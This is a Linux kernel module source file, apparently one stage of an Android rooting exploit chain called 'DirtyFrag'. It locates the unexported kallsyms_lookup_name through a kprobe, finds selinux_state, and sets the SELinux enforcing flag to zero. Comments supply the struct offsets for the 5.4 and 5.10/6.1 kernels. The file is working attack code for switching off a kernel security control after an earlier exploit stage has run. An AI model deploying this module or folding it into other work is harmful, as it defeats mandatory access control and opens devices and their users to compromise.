// DirtyFrag module pipeline: the SELinux switch.
//
// The page-cache stub has already run in init. This module does the one
// kernel-side job the chain needs: set selinux_state.enforcing = 0, so the
// userspace Magisk late install can patch the policy (no domain has
// security:security load_policy under Enforcing). Read the address through
// the unexported kallsyms_lookup_name via kprobe, as the reference module.
//
// `enforcing` is not always at the struct base. The 5.4 family keeps an
// unconditional `bool disabled` as the first field, so enforcing is at +1;
// 5.10/6.1 compile `disabled` out (CONFIG_SECURITY_SELINUX_DISABLE=n) and it
// is at +0. The offset is a build input, never a guess: build.sh refuses to
// run without it. A module built for the wrong offset still loads, still
// clears a byte and still logs that same byte back, so it reads as success
// while the kernel stays enforcing -- the 5.4 pair shipped that way once.
#ifndef DFSWITCH_ENFORCING_OFFSET
#error "define DFSWITCH_ENFORCING_OFFSET: 1 on the 5.4 family, 0 on 5.10/6.1"
#endif
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/module.h>

static struct kprobe probe = { .symbol_name = "kallsyms_lookup_name" };

static int __init dfswitch_init(void)
{
	unsigned long (*lookup)(const char *name);
	unsigned long state;
	int ret = register_kprobe(&probe);

	pr_info("DFSWITCH register_kprobe ret=%d addr=%px\n", ret, probe.addr);
	if (ret)
		return ret;
	lookup = (unsigned long (*)(const char *))probe.addr;
	state = lookup("selinux_state");
	if (state) {
		volatile unsigned char *enforcing =
			(volatile unsigned char *)state + DFSWITCH_ENFORCING_OFFSET;

		*enforcing = 0;
		pr_info("DFSWITCH selinux_state=%px offset=%d enforcing=%d\n",
			(void *)state, DFSWITCH_ENFORCING_OFFSET, (int)*enforcing);
	} else {
		pr_info("DFSWITCH selinux_state not found\n");
	}
	unregister_kprobe(&probe);
	return state ? 0 : -ENOENT;
}

static void __exit dfswitch_exit(void)
{
	pr_info("DFSWITCH exit\n");
}

module_init(dfswitch_init);
module_exit(dfswitch_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DirtyFrag SELinux switch");
